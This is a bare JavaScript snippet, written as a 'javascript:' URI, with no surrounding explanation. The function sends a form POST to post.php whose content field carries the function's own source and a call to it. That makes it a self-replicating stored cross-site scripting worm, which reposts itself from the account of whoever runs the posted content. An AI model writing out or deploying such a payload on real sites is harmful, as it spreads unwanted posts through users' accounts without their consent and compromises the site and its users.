javascript:
function f() {
	var http = new XMLHttpRequest();
	var form = new FormData();
	form.append('title', 'ABC');
	form.append('content', 'javascript:'+f.toString()+'; f();');
	form.append('type', 2);
	form.append('form', 'content');
	form.append('submit', 'Post');
	http.open('POST', 'post.php', true); http.send(form);
};
f();
